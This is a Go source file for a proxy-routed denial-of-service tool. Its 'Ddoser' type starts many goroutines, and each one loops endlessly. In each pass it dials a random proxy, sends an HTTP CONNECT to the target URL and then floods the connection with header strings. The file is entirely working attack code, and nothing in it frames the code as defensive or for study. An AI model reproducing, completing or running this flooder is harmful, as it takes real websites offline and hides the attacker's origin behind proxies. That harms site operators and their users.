package main

import (
	"bufio"
	"net"
	"time"

	"github.com/valyala/fasthttp"
)

type Ddoser struct {
	url        string
	numWorkers int
	headers    []string
	proxies    []string
}

func NewDdoser(target string, number int, headers, proxies []string) (*Ddoser, error) {
	return &Ddoser{
		url:        target,
		numWorkers: number,
		headers:    headers,
		proxies:    proxies,
	}, nil
}

func (d *Ddoser) Run() {
	for i := 0; i < d.numWorkers; i++ {
		go func() {
			var conn net.Conn
			var err error
			for {
				if conn, err = fasthttp.DialTimeout(random(d.proxies), time.Second*5); err != nil {
					continue
				}

				req := "CONNECT " + d.url + " HTTP/1.1\r\n\r\n"

				if _, err = conn.Write([]byte(req)); err != nil {
					continue
				}

				if err = func() error {
					res := fasthttp.AcquireResponse()
					defer fasthttp.ReleaseResponse(res)

					res.SkipBody = true

					if err = res.Read(bufio.NewReader(conn)); err != nil {
						conn.Close()
						return err
					}

					if res.StatusCode() != 200 {
						conn.Close()
						return err
					}

					return nil
				}(); err != nil {
					continue
				}

				for i := 0; i < len(d.headers); i++ {
					if _, err = conn.Write([]byte(d.headers[i])); err != nil {
						conn.Close()
						break
					}
				}
			}
		}()
	}
}
